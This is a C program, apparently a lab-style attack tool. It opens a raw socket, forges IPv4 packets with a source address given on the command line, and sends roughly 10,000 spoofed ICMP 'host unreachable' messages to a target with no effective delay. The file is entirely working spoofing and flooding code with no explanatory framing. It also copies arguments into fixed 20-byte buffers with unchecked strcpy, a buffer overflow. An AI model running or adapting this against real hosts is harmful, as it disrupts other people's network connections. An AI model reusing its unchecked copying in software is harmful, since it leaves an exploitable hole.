#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>


/* IP Header */

struct ipheader
{
	unsigned char iph_ihl:4;
	unsigned char iph_ver:4;
	unsigned char iph_tos;
	unsigned short int  iph_len;
	unsigned short int  iph_ident;
	unsigned short int  iph_flag:3;
	unsigned short int  iph_offset:13;
	unsigned char iph_ttl;
	unsigned char iph_protocol;
	unsigned short int  iph_chksum;
	struct in_addr iph_sourceip;
	struct in_addr iph_destip;
	
};


/* ICMP Header */
struct icmpheader
{
	unsigned char icmp_type; //ICMP message type
	unsigned char icmp_code; //Error Code
	unsigned short int icmp_chksum; //Checksum for ICMP Header and data
	unsigned short int  icmp_id; //Used for identifying request
	unsigned short int icmp_seq; //Sequence Number

};

unsigned short in_cksum (unsigned short *buf, int length){

	unsigned short *w = buf;
	int nleft = length;
	int sum = 0;
	unsigned short temp = 0;

	while(nleft>1){

		sum += *w++;
		nleft -=2;
	}

	if(nleft == 1){
		*(u_char *) (&temp) = *(u_char *)w;
		sum += temp; 
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (unsigned short) (~sum);


}

void send_raw_ip_packet(struct ipheader* ip){

	struct sockaddr_in dest_info;
	int enable = 1;


	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

	dest_info.sin_family = AF_INET;
	dest_info.sin_addr = ip->iph_destip;

	sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *) &dest_info, sizeof(dest_info));

	close(sock);

}




int main(int argc, char **argv){

	char source[20],destination[20];
	int packet_count= 10000;

	strcpy(source,argv[1]);
	strcpy(destination,argv[2]);

	printf("Source IP of the ICMP Packet: %s\n",source );
	printf("Destination IP of the ICMP Packet:%s\n",destination );


	char buffer[1500];

	memset(buffer,0,1500);

	int i;

	struct icmpheader *icmp = (struct icmpheader *) (buffer + sizeof(struct ipheader));
	icmp->icmp_type = 3;
	icmp->icmp_code = 1;
	icmp->icmp_chksum = 0;
	icmp->icmp_chksum = in_cksum((unsigned short *)icmp,sizeof(struct icmpheader));


	struct ipheader *ip = (struct ipheader *) buffer;
	ip->iph_ver = 4;
	ip->iph_ihl = 5;
	ip->iph_ttl = 20;
	ip->iph_sourceip.s_addr = inet_addr(source);
	ip->iph_destip.s_addr = inet_addr(destination);
	ip->iph_protocol = IPPROTO_ICMP;
	ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct icmpheader));

	

	for(i=0;i<=packet_count;i++){

		sleep(0.5);
		send_raw_ip_packet(ip);
	}

	printf("Total %d packets sent....... \n",packet_count);
	
	return 0;



}